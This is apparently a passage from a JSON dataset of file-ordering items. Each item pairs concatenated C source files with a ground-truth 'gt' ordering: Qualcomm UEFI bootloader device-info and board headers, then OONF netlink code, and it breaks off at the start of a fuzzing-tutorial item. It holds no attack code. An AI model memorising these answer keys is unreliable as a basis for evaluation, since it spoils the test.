CmdLineLen)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (CmdLineLen > ARRAY_SIZE (DevInfo.Display_Cmdline))\n  {\n    DEBUG ((EFI_D_ERROR, \"DisplayCmdLine, too large!\\n\"));\n    return EFI_OUT_OF_RESOURCES;\n  }\n\n  gBS->SetMem (DevInfo.Display_Cmdline, sizeof (DevInfo.Display_Cmdline), 0);\n  gBS->CopyMem (DevInfo.Display_Cmdline, (CHAR8 *) CmdLine, CmdLineLen);\n\n\n  return Status;\n}\n\nEFI_STATUS\nReadDisplayCmdLine (CHAR8 **CmdLine, UINT32 *CmdLineLen)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n\n\n  *CmdLine = DevInfo.Display_Cmdline;\n  *CmdLineLen = ARRAY_SIZE (DevInfo.Display_Cmdline);\n\n  return Status;\n}\n\nEFI_STATUS\nEnableEnforcingMode (BOOLEAN IsEnabled)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (IsEnforcing () != IsEnabled) {\n    DevInfo.verity_mode = IsEnabled;\n\n  }\n\n  return Status;\n}\n\nSTATIC EFI_STATUS\nSetUnlockValue (BOOLEAN State)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (IsUnlocked () != State) {\n    DevInfo.is_unlocked = State;\n\n  }\n\n  return Status;\n}\n\nSTATIC EFI_STATUS\nSetUnlockCriticalValue (BOOLEAN State)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (IsUnlockCritical () != State) {\n    DevInfo.is_unlock_critical = State;\n\n  }\n  return Status;\n}\n\nEFI_STATUS\nSetDeviceUnlockValue (UINT32 Type, BOOLEAN State)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  struct RecoveryMessage Msg;\n  EFI_GUID Ptype = gEfiMiscPartitionGuid;\n  MemCardType CardType = UNKNOWN;\n\n  switch (Type) {\n  case UNLOCK:\n    Status = SetUnlockValue (State);\n    break;\n  case UNLOCK_CRITICAL:\n    Status = SetUnlockCriticalValue (State);\n    break;\n  default:\n    Status = EFI_UNSUPPORTED;\n    break;\n  }\n  if (Status != EFI_SUCCESS)\n    return Status;\n\n  Status = ResetDeviceState ();\n  if (Status != EFI_SUCCESS) {\n    if (Type == UNLOCK)\n      SetUnlockValue (!State);\n    else if (Type == UNLOCK_CRITICAL)\n      SetUnlockCriticalValue (!State);\n\n    DEBUG ((EFI_D_ERROR, \"Unable to set the Value: %r\", Status));\n    return Status;\n  }\n\n  gBS->SetMem ((VOID *)&Msg, sizeof (Msg), 0);\n  Status = AsciiStrnCpyS (Msg.recovery, sizeof (Msg.recovery),\n                          RECOVERY_WIPE_DATA, AsciiStrLen (RECOVERY_WIPE_DATA));\n  if (Status == EFI_SUCCESS) {\n    CardType = CheckRootDeviceType ();\n    if (CardType == NAND) {\n      Status = GetNandMiscPartiGuid (&Ptype);\n      if (Status != EFI_SUCCESS) {\n        return Status;\n      }\n    }\n\n    Status = WriteToPartition (&Ptype, &Msg, sizeof (Msg));\n  }\n\n  return Status;\n}\n\nEFI_STATUS\nUpdateDevInfo (CHAR16 *Pname, CHAR8 *ImgVersion)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (!StrCmp ((CONST CHAR16 *)Pname, (CONST CHAR16 *)L\"bootloader\")) {\n    AsciiStrnCpyS (DevInfo.bootloader_version, MAX_VERSION_LEN, FixedPcdGetPtr(PcdABLProduct),\n                   AsciiStrLen (FixedPcdGetPtr(PcdABLProduct)));\n    AsciiStrnCatS (DevInfo.bootloader_version, MAX_VERSION_LEN, \"-\",\n                   AsciiStrLen (\"-\"));\n    AsciiStrnCatS (DevInfo.bootloader_version, MAX_VERSION_LEN, ImgVersion,\n                   AsciiStrLen (ImgVersion));\n  } else {\n    AsciiStrnCpyS (DevInfo.radio_version, MAX_VERSION_LEN, FixedPcdGetPtr(PcdABLProduct),\n                   AsciiStrLen (FixedPcdGetPtr(PcdABLProduct)));\n    AsciiStrnCatS (DevInfo.radio_version, MAX_VERSION_LEN, \"-\",\n                   AsciiStrLen (\"-\"));\n    AsciiStrnCatS (DevInfo.radio_version, MAX_VERSION_LEN, ImgVersion,\n                   AsciiStrLen (ImgVersion));\n  }\n\n\n  return Status;\n}\n\nEFI_STATUS DeviceInfoInit (VOID)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (FirstReadDevInfo) {\n\n\n    DevInfo.magic[0] = 'A';\n    DevInfo.magic[1] = 'N';\n    DevInfo.magic[2] = 'D';\n    DevInfo.magic[3] = 'R';\n    DevInfo.magic[4] = 'O';\n    DevInfo.magic[5] = 'I';\n    DevInfo.magic[6] = 'D';\n    DevInfo.magic[7] = '-';\n    DevInfo.magic[8] = 'B';\n    DevInfo.magic[9] = 'O';\n    DevInfo.magic[10] = 'O';\n    DevInfo.magic[11] = 'T';\n    DevInfo.magic[12] = '!';\n    DevInfo.is_unlocked = TRUE;\n    DevInfo.is_unlock_critical = TRUE;\n    DevInfo.is_charger_screen_enabled = FALSE;\n    DevInfo.bootloader_version[0] = '1';\n    DevInfo.bootloader_version[1] = '.';\n    DevInfo.bootloader_version[2] = '0';\n    DevInfo.bootloader_version[3] = '.';\n    DevInfo.bootloader_version[4] = '0';\n    DevInfo.bootloader_version[5] = '.';\n    DevInfo.bootloader_version[6] = '0';\n    DevInfo.radio_version[0] = '1';\n    DevInfo.radio_version[1] = '.';\n    DevInfo.radio_version[2] = '0';\n    DevInfo.radio_version[3] = '.';\n    DevInfo.radio_version[4] = '0';\n    DevInfo.radio_version[5] = '.';\n    DevInfo.radio_version[6] = '0';\n    DevInfo.verity_mode = FALSE;\n    DevInfo.user_public_key_length = 0;\n\n\n\n    FirstReadDevInfo = FALSE;\n  }\n\n  if (CompareMem (DevInfo.magic, DEVICE_MAGIC, DEVICE_MAGIC_SIZE)) {\n    DEBUG ((EFI_D_ERROR, \"Device Magic does not match\\n\"));\n    gBS->SetMem (&DevInfo, sizeof (DevInfo), 0);\n    gBS->CopyMem (DevInfo.magic, DEVICE_MAGIC, DEVICE_MAGIC_SIZE);\n    DevInfo.user_public_key_length = 0;\n    gBS->SetMem (DevInfo.rollback_index, sizeof (DevInfo.rollback_index), 0);\n    gBS->SetMem (DevInfo.user_public_key, sizeof (DevInfo.user_public_key), 0);\n    if (IsSecureBootEnabled ()) {\n      DevInfo.is_unlocked = FALSE;\n      DevInfo.is_unlock_critical = FALSE;\n    } else {\n      DevInfo.is_unlocked = TRUE;\n      DevInfo.is_unlock_critical = TRUE;\n    }\n    DevInfo.is_charger_screen_enabled = FALSE;\n    DevInfo.verity_mode = TRUE;\n\n  }\n\n  return Status;\n}\n\nEFI_STATUS\nReadRollbackIndex (UINT32 Loc, UINT64 *RollbackIndex)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (FirstReadDevInfo) {\n    Status = EFI_NOT_STARTED;\n    DEBUG ((EFI_D_ERROR, \"ReadRollbackIndex DeviceInfo not initalized \\n\"));\n    return Status;\n  }\n\n  if (Loc >= ARRAY_SIZE (DevInfo.rollback_index)) {\n    Status = EFI_INVALID_PARAMETER;\n    DEBUG ((EFI_D_ERROR, \"ReadRollbackIndex Loc out of range, \"\n                         \"index: %d, array len: %d\\n\",\n            Loc, ARRAY_SIZE (DevInfo.rollback_index)));\n    return Status;\n  }\n\n  *RollbackIndex = DevInfo.rollback_index[Loc];\n  return Status;\n}\n\nEFI_STATUS\nWriteRollbackIndex (UINT32 Loc, UINT64 RollbackIndex)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (FirstReadDevInfo) {\n    Status = EFI_NOT_STARTED;\n    DEBUG ((EFI_D_ERROR, \"WriteRollbackIndex DeviceInfo not initalized \\n\"));\n    return Status;\n  }\n\n  if (Loc >= ARRAY_SIZE (DevInfo.rollback_index)) {\n    Status = EFI_INVALID_PARAMETER;\n    DEBUG ((EFI_D_ERROR, \"WriteRollbackIndex Loc out of range, \"\n                         \"index: %d, array len: %d\\n\",\n            Loc, ARRAY_SIZE (DevInfo.rollback_index)));\n    return Status;\n  }\n\n  DevInfo.rollback_index[Loc] = RollbackIndex;\n\n  return Status;\n}\n\nEFI_STATUS\nStoreUserKey (CHAR8 *UserKey, UINT32 UserKeySize)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (FirstReadDevInfo) {\n    Status = EFI_NOT_STARTED;\n    DEBUG ((EFI_D_ERROR, \"StoreUserKey DeviceInfo not initalized \\n\"));\n    return Status;\n  }\n\n  if (UserKeySize > ARRAY_SIZE (DevInfo.user_public_key)) {\n    DEBUG ((EFI_D_ERROR, \"StoreUserKey, UserKeySize too large!\\n\"));\n    return EFI_OUT_OF_RESOURCES;\n  }\n\n  gBS->CopyMem (DevInfo.user_public_key, UserKey, UserKeySize);\n  DevInfo.user_public_key_length = UserKeySize;\n\n  return Status;\n}\n\nEFI_STATUS EraseUserKey (VOID)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n\n  if (FirstReadDevInfo) {\n    Status = EFI_NOT_STARTED;\n    DEBUG ((EFI_D_ERROR, \"EraseUserKey DeviceInfo not initalized \\n\"));\n    return Status;\n  }\n\n  gBS->SetMem (DevInfo.user_public_key, sizeof (DevInfo.user_public_key), 0);\n  DevInfo.user_public_key_length = 0;\n\n  return Status;\n}\n\nEFI_STATUS\nGetUserKey (CHAR8 **UserKey, UINT32 *UserKeySize)\n{\n  if (FirstReadDevInfo) {\n    DEBUG ((EFI_D_ERROR, \"GetUserKey DeviceInfo not initalized \\n\"));\n    return EFI_NOT_STARTED;\n  }\n\n  *UserKey = DevInfo.user_public_key;\n  *UserKeySize = DevInfo.user_public_key_length;\n  return EFI_SUCCESS;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIPmicVersion.h'\n:\n\n#ifndef __EFIPMICVERSION_H__\n#define __EFIPMICVERSION_H__\n\n\n\n#define PMIC_VERSION_REVISION 0x0000000000010003\n\n\n\n\n#define EFI_PMIC_VERSION_PROTOCOL_GUID                                         \\\n  {                                                                            \\\n    0x4684800a, 0x2755, 0x4edc,                                                \\\n    {                                                                          \\\n      0xb4, 0x43, 0x7f, 0x8c, 0xeb, 0x32, 0x39, 0xd3                           \\\n    }                                                                          \\\n  }\n\n\n\nextern EFI_GUID gQcomPmicVersionProtocolGuid;\n\n\n\ntypedef struct _EFI_QCOM_PMIC_VERSION_PROTOCOL EFI_QCOM_PMIC_VERSION_PROTOCOL;\n\n\n\n\n\ntypedef enum\n{\n   EFI_PMIC_IS_UNKNOWN   = 0,\n   EFI_PMIC_IS_PM8941    = 1,\n   EFI_PMIC_IS_PM8841    = 2,\n   EFI_PMIC_IS_PM8019    = 3,\n   EFI_PMIC_IS_PM8026    = 4,\n   EFI_PMIC_IS_PM8110    = 5,\n   EFI_PMIC_IS_PMA8084   = 6,\n   EFI_PMIC_IS_PMI8962   = 7,\n   EFI_PMIC_IS_PMD9635   = 8,\n   EFI_PMIC_IS_PM8994    = 9,\n   EFI_PMIC_IS_PMI8994   = 0xA,\n   EFI_PMIC_IS_PM8916    = 0xB,\n   EFI_PMIC_IS_PM8004    = 0xC,\n   EFI_PMIC_IS_PM8909    = 0xD,\n   EFI_PMIC_IS_PM2433    = 0xE,\n   EFI_PMIC_IS_PMD9655   = 0xF,\n   EFI_PMIC_IS_PMF2432   = EFI_PMIC_IS_PMA8084,\n   EFI_PMIC_IS_PM8950    = 0x10,\n   EFI_PMIC_IS_PMI8950   = 0x11,\n   EFI_PMIC_IS_PMI8937   = 0x11,\n   EFI_PMIC_IS_PMK8001   = 0x12,\n   EFI_PMIC_IS_PMI8996   = 0x13,\n   EFI_PMIC_IS_PM8998    = 0x14,\n   EFI_PMIC_IS_PMI8998   = 0x15,\n   EFI_PMIC_IS_PM8953    = 0x16,\n   EFI_PMIC_IS_PM8005    = 0x18,\n   EFI_PMIC_IS_PM8937    = 0x19,\n   EFI_PMIC_IS_PM660L    = 0x1A,\n   EFI_PMIC_IS_PM660     = 0x1B,\n   EFI_PMIC_IS_PM855     = 0x1E,\n   EFI_PMIC_IS_PM8150    = EFI_PMIC_IS_PM855,\n   EFI_PMIC_IS_PM855L    = 0x1F,\n   EFI_PMIC_IS_PM8150L   = EFI_PMIC_IS_PM855L,\n   EFI_PMIC_IS_PM6150L   = EFI_PMIC_IS_PM855L,\n   EFI_PMIC_IS_PM855B    = 0x20,\n   EFI_PMIC_IS_PM8150B   = EFI_PMIC_IS_PM855B,\n   EFI_PMIC_IS_PMK8002   = 0x21,\n   EFI_PMIC_IS_PMX24     = 0x22,\n   EFI_PMIC_IS_SMB2351   = 0x29,\n   EFI_PMIC_IS_PMX55     = 0x2A,\n   EFI_PMIC_IS_INVALID   = 0x7FFFFFFF,\n} EFI_PM_MODEL_TYPE;\n\n\ntypedef struct {\n  EFI_PM_MODEL_TYPE PmicModel;\n\n  UINT32 PmicAllLayerRevision;\n\n  UINT32 PmicMetalRevision;\n\n} EFI_PM_DEVICE_INFO_TYPE;\n\n\n\ntypedef struct {\n  EFI_PM_MODEL_TYPE PmicModel;\n\n  UINT32 PmicAllLayerRevision;\n\n  UINT32 PmicMetalRevision;\n\n  UINT32 PmicVariantRevision;\n\n} EFI_PM_DEVICE_INFO_EXT_TYPE;\n\n\n\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_PM_GET_PMIC_INFO) (\n    IN UINT32 PmicDeviceIndex,\n    OUT EFI_PM_DEVICE_INFO_TYPE *PmicDeviceInfo);\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_PM_GET_PMIC_INFO_EXT) (\n    IN UINT32 PmicDeviceIndex,\n    OUT EFI_PM_DEVICE_INFO_EXT_TYPE *PmicDeviceInfo);\n\n\n\nstruct _EFI_QCOM_PMIC_VERSION_PROTOCOL {\n  UINT64 Revision;\n  EFI_PM_GET_PMIC_INFO GetPmicInfo;\n  EFI_PM_GET_PMIC_INFO_EXT GetPmicInfoExt;\n};\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Board.h'\n:\n\n\n#ifndef __BOARD_H__\n#define __BOARD_H__\n\n#include <Uefi.h>\n#include <Library/DebugLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Protocol/EFIChipInfo.h>\n#include <Protocol/EFIPlatformInfo.h>\n#include <Protocol/EFIPmicVersion.h>\n#include <Protocol/EFIRamPartition.h>\n#include <Protocol/EFISoftSkuInfo.h>\n\n#define HANDLE_MAX_INFO_LIST 128\n#define CHIP_BASE_BAND_LEN 4\n#define CHIP_BASE_BAND_MSM \"msm\"\n#define CHIP_BASE_BAND_APQ \"apq\"\n#define CHIP_BASE_BAND_MDM \"mdm\"\n\n#define BIT(x) (1ULL << x)\n\nextern RamPartitionEntry *RamPartitionEntries;\n\ntypedef enum {\n  EMMC = 0,\n  UFS = 1,\n  NAND = 2,\n  UNKNOWN,\n} MemCardType;\n\n#define DDR_SHIFT      8\n\n#define MB             (1024 * 1024UL)\n#define DDR_256MB      (256 * MB)\n#define DDR_512MB      (512 * MB)\n#define DDR_1024MB     (1024 * MB)\n#define DDR_2048MB     (2048 * MB)\n\ntypedef enum {\n  DDRTYPE_256MB = 1,\n  DDRTYPE_512MB,\n  DDRTYPE_1024MB,\n  DDRTYPE_2048MB,\n} DdrType;\n\nstruct BoardInfo {\n  EFI_PLATFORMINFO_PLATFORM_INFO_TYPE PlatformInfo;\n  UINT32 RawChipId;\n  CHAR8 ChipBaseBand[EFICHIPINFO_MAX_ID_LENGTH];\n  EFIChipInfoVersionType ChipVersion;\n  EFIChipInfoFoundryIdType FoundryId;\n  UINT32 HlosSubType;\n  UINT32 SoftSkuId;\n};\n\nEFI_STATUS\nBaseMem (UINT64 *BaseMemory);\n\nUINT32\nBoardPmicModel (UINT32 PmicDeviceIndex);\n\nUINT32\nBoardPmicTarget (UINT32 PmicDeviceIndex);\n\nEFI_STATUS BoardInit (VOID);\n\nEFI_STATUS\nBoardSerialNum (CHAR8 *StrSerialNum, UINT32 Len);\nUINT32 BoardPlatformRawChipId (VOID);\nCHAR8 *BoardPlatformChipBaseBand (VOID);\nEFIChipInfoVersionType BoardPlatformChipVersion (VOID);\nEFIChipInfoFoundryIdType BoardPlatformFoundryId (VOID);\nEFI_PLATFORMINFO_PLATFORM_TYPE BoardPlatformType (VOID);\nUINT32 BoardPlatformVersion (VOID);\nUINT32 BoardPlatformSubType (VOID);\nUINT32 BoardTargetId (VOID);\nVOID\nGetRootDeviceType (CHAR8 *StrDeviceType, UINT32 Len);\nMemCardType\nCheckRootDeviceType (VOID);\nVOID\nBoardHwPlatformName (CHAR8 *StrHwPlatform, UINT32 Len);\nEFI_STATUS\nUfsGetSetBootLun (UINT32 *UfsBootlun, BOOLEAN IsGet);\nBOOLEAN BoardPlatformFusion (VOID);\nUINT32 BoardPlatformRawChipId (VOID);\nEFI_STATUS ReadRamPartitions (RamPartitionEntry **RamPartitions,\n                  UINT32 *NumPartitions);\nEFI_STATUS GetGranuleSize (UINT32 *MinPasrGranuleSize);\nVOID GetPageSize (UINT32 *PageSize);\nEFI_STATUS BoardDdrType (UINT32 *Type);\nUINT32 BoardPlatformHlosSubType (VOID);\nVOID BoardSoftSku (EFI_SOFT_SKU_ID *SkuId);\nUINT32 BoardSoftSkuId (VOID);\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIPmicVersion.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Board.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/DeviceInfo.c'"
        ]
    },
    {
        "files": [
            "'OONF/include/oonf/base/os_linux/os_interface_linux_internal.h'",
            "'OONF/include/oonf/generic/nl80211_listener/nl80211_listener.h'",
            "'OONF/include/oonf/base/os_interface.h'",
            "'OONF/src/generic/nl80211_listener/genl_get_family.c'"
        ],
        "content": "'OONF/include/oonf/base/os_linux/os_interface_linux_internal.h'\n:\n\n\n\n\n#ifndef OS_INTERFACE_LINUX_INTERNAL_H_\n#define OS_INTERFACE_LINUX_INTERNAL_H_\n\n#include <linux/netlink.h>\n#include <linux/rtnetlink.h>\n\n#include <oonf/oonf.h>\n#include <oonf/base/os_interface.h>\n\n\nenum os_addr_scope\n{\n\n  OS_ADDR_SCOPE_LINK = RT_SCOPE_LINK,\n\n  OS_ADDR_SCOPE_GLOBAL = RT_SCOPE_UNIVERSE,\n};\n\n\nstruct os_interface_address_change_internal {\n\n  struct list_entity _node;\n\n\n  uint32_t nl_seq;\n};\n\nstruct os_interface_internal {\n\n  bool ignore_mesh;\n\n\n  uint32_t mesh_counter;\n\n\n  char _original_ip_spoof;\n\n\n  char _original_icmp_redirect;\n\n\n  bool configured;\n};\n\n#endif\n\n'OONF/include/oonf/generic/nl80211_listener/nl80211_listener.h'\n:\n\n\n\n\n#ifndef NL80211_LISTENER_H_\n#define NL80211_LISTENER_H_\n\n#include <oonf/oonf.h>\n#include <oonf/libcore/oonf_subsystem.h>\n#include <oonf/base/oonf_layer2.h>\n#include <oonf/base/os_interface.h>\n\n\n#define OONF_NL80211_LISTENER_SUBSYSTEM \"nl80211_listener\"\n\n\nstruct nl80211_if {\n\n  char name[IF_NAMESIZE];\n\n\n  struct os_interface_listener if_listener;\n\n\n  struct oonf_layer2_net *l2net;\n\n\n  int wifi_phy_if;\n\n\n  uint64_t max_tx;\n\n\n  uint64_t max_rx;\n\n\n  bool ifdata_changed;\n\n\n  bool _remove;\n\n\n  bool _if_section;\n\n\n  bool _nl80211_section;\n\n\n  struct avl_node _node;\n};\n\nstruct oonf_layer2_destination *nl80211_add_dst(struct oonf_layer2_neigh *, const struct netaddr *dst);\nbool nl80211_change_l2net_data(struct oonf_layer2_net *l2net, enum oonf_layer2_network_index idx,\n                               int64_t value, int64_t scaling);\nbool nl80211_change_l2net_neighbor_default(\n  struct oonf_layer2_net *l2net, enum oonf_layer2_neighbor_index idx, int64_t value, int64_t scaling);\nvoid nl80211_cleanup_l2neigh_data(struct oonf_layer2_neigh *l2neigh);\nbool nl80211_change_l2neigh_data(\n  struct oonf_layer2_neigh *l2neigh, enum oonf_layer2_neighbor_index idx, int64_t value, int64_t scaling);\nbool nl80211_create_broadcast_neighbor(void);\n\n\nstatic INLINE unsigned\nnl80211_get_if_baseindex(struct nl80211_if *interf) {\n  return interf->if_listener.data->base_index;\n}\n\n#endif\n\n'OONF/include/oonf/base/os_interface.h'\n:\n\n\n\n\n#ifndef OS_INTERFACE_H_\n#define OS_INTERFACE_H_\n\n#include <stdio.h>\n#include <sys/time.h>\n\n#include <oonf/oonf.h>\n#include <oonf/libcommon/list.h>\n#include <oonf/libcore/oonf_logging.h>\n#include <oonf/base/oonf_timer.h>\n#include <oonf/base/os_interface.h>\n\n\n#define OONF_OS_INTERFACE_SUBSYSTEM \"os_interface\"\n\n\n#define CFG_OSIF_SCHEMA_INTERFACE_SECTION_INIT .type = \"interface\", .mode = CFG_SSMODE_NAMED\n\n\n#if defined(__linux__)\n#include <oonf/base/os_linux/os_interface_linux_internal.h>\n#else\n#error \"Unknown operation system\"\n#endif\n\n\nstruct os_interface_ip_change {\n\n  struct os_interface_address_change_internal _internal;\n\n\n  struct netaddr address;\n\n\n  unsigned int if_index;\n\n\n  enum os_addr_scope scope;\n\n\n  bool set;\n\n\n  void (*cb_finished)(struct os_interface_ip_change *addr, int error);\n};\n\nstruct os_interface_flags {\n\n  bool up;\n\n\n  bool promisc;\n\n\n  bool pointtopoint;\n\n\n  bool loopback;\n\n\n  bool any;\n\n\n  bool unicast_only;\n\n\n  bool mesh;\n};\n\n\nstruct os_interface {\n\n  struct os_interface_internal _internal;\n\n\n  char name[IF_NAMESIZE];\n\n\n  unsigned index;\n\n\n  unsigned base_index;\n\n\n  struct os_interface_flags flags;\n\n\n  struct netaddr mac;\n\n\n  const struct netaddr *if_v4;\n\n\n  const struct netaddr *if_v6;\n\n\n  const struct netaddr *if_linklocal_v4;\n\n\n  const struct netaddr *if_linklocal_v6;\n\n\n  struct avl_tree addresses;\n\n\n  struct avl_tree peers;\n\n\n  struct list_entity _listeners;\n\n\n  uint64_t retrigger_timeout;\n\n\n  struct avl_node _node;\n\n\n  struct oonf_timer_instance _change_timer;\n\n\n  bool _link_initialized;\n\n\n  bool _addr_initialized;\n};\n\n\nstruct os_interface_ip {\n  struct avl_node _node;\n\n  struct netaddr prefixed_addr;\n  struct netaddr address;\n  struct netaddr prefix;\n\n  struct os_interface *interf;\n};\n\n\nstruct os_interface_listener {\n\n  const char *name;\n\n\n  bool mesh;\n\n\n  int (*if_changed)(struct os_interface_listener *);\n\n\n  struct os_interface *data;\n\n\n  bool _dirty;\n\n\n  struct list_entity _node;\n};\n\n\n#if defined(__linux__)\n#include <oonf/base/os_linux/os_interface_linux.h>\n#else\n#error \"Unknown operation system\"\n#endif\n\n\nstatic INLINE struct os_interface *os_interface_add(struct os_interface_listener *);\nstatic INLINE void os_interface_remove(struct os_interface_listener *);\nstatic INLINE struct avl_tree *os_interface_get_tree(void);\n\nstatic INLINE void os_interface_trigger_handler(struct os_interface_listener *);\n\nstatic INLINE int os_interface_state_set(struct os_interface *, bool up);\nstatic INLINE int os_interface_mac_set(struct os_interface *interf, struct netaddr *mac);\n\nstatic INLINE int os_interface_address_set(struct os_interface_ip_change *addr);\nstatic INLINE void os_interface_address_interrupt(struct os_interface_ip_change *addr);\n\nstatic INLINE struct os_interface *os_interface_get_data_by_ifindex(unsigned ifindex);\nstatic INLINE struct os_interface *os_interface_get_data_by_ifbaseindex(unsigned ifindex);\nstatic INLINE const struct netaddr *os_interface_get_bindaddress(\n  int af_type, struct netaddr_acl *filter, struct os_interface *ifdata);\nstatic INLINE const struct os_interface_ip *os_interface_get_prefix_from_dst(\n  struct netaddr *destination, struct os_interface *ifdata);\n\n\nstatic INLINE struct os_interface *\nos_interface_get(const char *ifname) {\n  struct os_interface *interf;\n  return avl_find_element(os_interface_get_tree(), ifname, interf, _node);\n}\n\n#endif\n\n'OONF/src/generic/nl80211_listener/genl_get_family.c'\n:\n\n\n\n\n\n\n#define _GNU_SOURCE\n\n\n#include <sys/socket.h>\n\n\n#include <linux/genetlink.h>\n#include <linux/netlink.h>\n#include <linux/types.h>\n#include <netlink/attr.h>\n#include <netlink/genl/genl.h>\n#include <netlink/msg.h>\n\n#include <oonf/oonf.h>\n#include <oonf/base/os_system.h>\n\n#include <oonf/generic/nl80211_listener/nl80211.h>\n#include <oonf/generic/nl80211_listener/genl_get_family.h>\n#include <oonf/generic/nl80211_listener/nl80211_internal.h>\n#include <oonf/generic/nl80211_listener/nl80211_listener.h>\n\n\nvoid\ngenl_send_get_family(struct nlmsghdr *nl_msg, struct genlmsghdr *hdr) {\n  hdr->cmd = CTRL_CMD_GETFAMILY;\n  hdr->version = 1;\n\n  nl_msg->nlmsg_flags |= NLM_F_DUMP;\n}\n\n\nvoid\ngenl_process_get_family_result(struct nlmsghdr *hdr, uint32_t *nl80211_id, uint32_t *nl80211_mc) {\n  static struct nla_policy ctrl_policy[CTRL_ATTR_MAX + 1] = {\n    [CTRL_ATTR_FAMILY_ID] = { .type = NLA_U16 },\n    [CTRL_ATTR_FAMILY_NAME] = { .type = NLA_STRING, .maxlen = GENL_NAMSIZ },\n    [CTRL_ATTR_VERSION] = { .type = NLA_U32 },\n    [CTRL_ATTR_HDRSIZE] = { .type = NLA_U32 },\n    [CTRL_ATTR_MAXATTR] = { .type = NLA_U32 },\n    [CTRL_ATTR_OPS] = { .type = NLA_NESTED },\n    [CTRL_ATTR_MCAST_GROUPS] = { .type = NLA_NESTED },\n  };\n  struct nlattr *attrs[CTRL_ATTR_MAX + 1];\n  struct nlattr *mcgrp;\n  int iterator;\n\n  if (nlmsg_parse(hdr, sizeof(struct genlmsghdr), attrs, CTRL_ATTR_MAX, ctrl_policy) < 0) {\n    OONF_WARN(LOG_NL80211, \"Cannot parse netlink CTRL_CMD_NEWFAMILY message\");\n    return;\n  }\n\n  if (attrs[CTRL_ATTR_FAMILY_ID] == NULL) {\n    OONF_WARN(LOG_NL80211, \"Missing Family ID in CTRL_CMD_NEWFAMILY\");\n    return;\n  }\n  if (attrs[CTRL_ATTR_FAMILY_NAME] == NULL) {\n    OONF_WARN(LOG_NL80211, \"Missing Family Name in CTRL_CMD_NEWFAMILY\");\n    return;\n  }\n\n  OONF_DEBUG(LOG_NL80211, \"Found Netlink family '%s'\\n\", nla_get_string(attrs[CTRL_ATTR_FAMILY_NAME]));\n\n  if (strcmp(nla_get_string(attrs[CTRL_ATTR_FAMILY_NAME]), \"nl80211\") != 0) {\n\n    return;\n  }\n\n  *nl80211_id = nla_get_u16(attrs[CTRL_ATTR_FAMILY_ID]);\n  OONF_DEBUG(LOG_NL80211, \"Received nl80211 family id: %d\\n\", *nl80211_id);\n\n  if (*nl80211_mc || !attrs[CTRL_ATTR_MCAST_GROUPS]) {\n\n    return;\n  }\n\n  nla_for_each_nested(mcgrp, attrs[CTRL_ATTR_MCAST_GROUPS], iterator) {\n    struct nlattr *tb_mcgrp[CTRL_ATTR_MCAST_GRP_MAX + 1];\n    uint32_t group;\n\n    nla_parse(tb_mcgrp, CTRL_ATTR_MCAST_GRP_MAX, nla_data(mcgrp), nla_len(mcgrp), NULL);\n\n    if (!tb_mcgrp[CTRL_ATTR_MCAST_GRP_NAME] || !tb_mcgrp[CTRL_ATTR_MCAST_GRP_ID])\n      continue;\n\n    group = nla_get_u32(tb_mcgrp[CTRL_ATTR_MCAST_GRP_ID]);\n    OONF_DEBUG(\n      LOG_NL80211, \"Found multicast group %s: %d\", (char *)nla_data(tb_mcgrp[CTRL_ATTR_MCAST_GRP_NAME]), group);\n\n    if (strcmp(nla_data(tb_mcgrp[CTRL_ATTR_MCAST_GRP_NAME]), \"mlme\"))\n      continue;\n\n    *nl80211_mc = group;\n  }\n}\n\n#if 0\n    if (os_system_netlink_add_mc(&netlink_handler, &group, 1)) {\n      OONF_WARN(LOG_NL80211,\n          \"Could not activate multicast group %d for nl80211\", group);\n    }\n    else {\n    }\n    break;\n  }\n}\n\n#endif\n",
        "gt": [
            "'OONF/include/oonf/base/os_linux/os_interface_linux_internal.h'",
            "'OONF/include/oonf/base/os_interface.h'",
            "'OONF/include/oonf/generic/nl80211_listener/nl80211_listener.h'",
            "'OONF/src/generic/nl80211_listener/genl_get_family.c'"
        ]
    },
    {
        "files": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCommand.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'"
        ],
